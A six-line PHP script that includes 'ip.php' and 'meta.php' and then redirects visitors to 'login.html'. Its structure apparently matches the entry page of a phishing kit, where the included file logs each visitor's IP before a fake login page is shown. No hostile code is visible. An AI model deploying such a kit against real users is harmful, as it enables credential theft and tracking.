<?php
include 'ip.php';
include 'meta.php';
header('Location: login.html');
exit();
?>
